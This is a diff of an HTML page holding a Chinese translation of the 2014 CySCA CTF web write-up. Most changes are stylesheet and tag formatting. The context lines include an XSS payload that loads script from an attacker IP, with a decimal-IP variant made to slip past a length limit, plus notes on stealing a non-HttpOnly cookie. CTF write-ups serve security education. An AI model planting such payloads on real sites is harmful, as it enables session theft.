@@ -3,16 +3,16 @@
 			<head>
 			     <title>2014年澳大利亚信息安全挑战 CySCA CTF 官方write up Web篇 - insight-labs</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/2444">http://drops.wooyun.org/tips/2444</a></h1>
 				
       <p>
-        <p>from:https://www.cyberchallenge.com.au/CySCA2014&#95;Web&#95;Penetration_Testing.pdf</p>
+        </p><p>from:https://www.cyberchallenge.com.au/CySCA2014&#95;Web&#95;Penetration_Testing.pdf</p>
 
 <h2>0x00 背景</h2>
 
-<hr />
+<hr>
 
 <p>一年一度的澳洲CySCA CTF是一个由澳洲政府和澳洲电信Telstra赞助的信息安全挑战赛，主要面向澳洲各大学的安全和计算机科学专业的学生。</p>
 
@@ -20,7 +20,7 @@
 
 <h2>0x01 第一题 非请勿入</h2>
 
-<hr />
+<hr>
 
 <p>说明：</p>
 
@@ -42,7 +42,7 @@ cookie没有http only，有可能被xss到
 
 <h2>0x02 第二题 好吃的小甜饼</h2>
 
-<hr />
+<hr>
 
 <p>说明:</p>
 
@@ -96,12 +96,12 @@ cookie没有http only，有可能被xss到
 
 <p>发送XSS payload <code>[&lt;SCRIPT SRC=//192.168.16.101/.j&gt;][1]</code></p>
 
-<p>然后坐等目标上钩...<br />
-.<br />
-.<br />
-.<br />
-等了这么久怎么还没有?<br />
-原来是192.168.16.101这个ip太长了，payload被截断了……<br />
+<p>然后坐等目标上钩...<br>
+.<br>
+.<br>
+.<br>
+等了这么久怎么还没有?<br>
+原来是192.168.16.101这个ip太长了，payload被截断了……<br>
 再仔细想想，好像很多浏览器支持十进制IP的,于是我们的payload变成了:</p>
 
 <pre><code>[&lt;script src=//3232239717/.j&gt;][1]   
@@ -120,7 +120,7 @@ cookie没有http only，有可能被xss到
 
 <h2>0x03 第三题 Nonce-Sense</h2>
 
-<hr />
+<hr>
 
 <p>说明:</p>
 
@@ -207,7 +207,7 @@ cysca ­T flag ­­dump
 
 <h2>0x04 第四题:Hypertextension</h2>
 
-<hr />
+<hr>
 
 <p>说明：</p>
 
@@ -324,7 +324,7 @@ die();
 
 <h2>0x05 第五题:注入空间 Injeption（尼玛真难翻译）</h2>
 
-<hr />
+<hr>
 
 <p>说明:</p>
 
@@ -375,7 +375,7 @@ die();
 
 <p>CFlag: TryingCrampFibrous963 </p>
 
-<p>Web篇完结。</p>      </p>
+<p>Web篇完结。</p>      <p></p>
     
 			</body>
 		</html>
